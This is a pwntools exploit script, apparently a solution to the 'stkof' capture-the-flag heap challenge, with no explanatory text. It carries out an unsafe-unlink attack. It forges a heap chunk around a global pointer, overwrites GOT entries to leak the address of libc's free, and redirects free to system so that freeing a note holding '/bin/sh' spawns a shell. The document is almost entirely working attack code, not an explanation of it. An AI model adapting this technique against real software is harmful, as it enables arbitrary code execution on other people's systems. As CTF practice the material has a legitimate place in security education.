from pwn import *

p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


heap_ptr_addr = 0x602150

def create_note(plen):
    p.sendline("1")
    p.sendline(str(plen))
    p.recvuntil("OK\n")

def write_note(idx, payload):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(payload)))
    p.send(payload)
    p.recvuntil("OK\n")

def drop_note(idx):
    p.sendline("3")
    p.sendline(str(idx))

def show_note(idx):
    p.sendline("4")
    p.sendline(str(idx))
    
create_note(0x20)
create_note(0x30)
create_note(0x80)
create_note(0x10)

payload = b"/bin/sh\x00"
write_note(4, payload)

fake_chunk = p64(0) + p64(0x31) + p64(heap_ptr_addr - 0x18) + p64(heap_ptr_addr - 0x10)
fake_chunk = fake_chunk.ljust(0x30, b'a')

pause()

write_note(2, fake_chunk + p64(0x30) + p64(0x90))

drop_note(3)

payload = p64(0) + p64(elf.got["strlen"]) + p64(elf.got["free"])
write_note(2, payload)
write_note(0, p64(elf.plt["puts"]))

show_note(1)

p.recvuntil("OK\n")
free_addr = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
print (hex(free_addr))
print (hex(system_addr))

write_note(1, p64(system_addr))
drop_note(4)

p.interactive()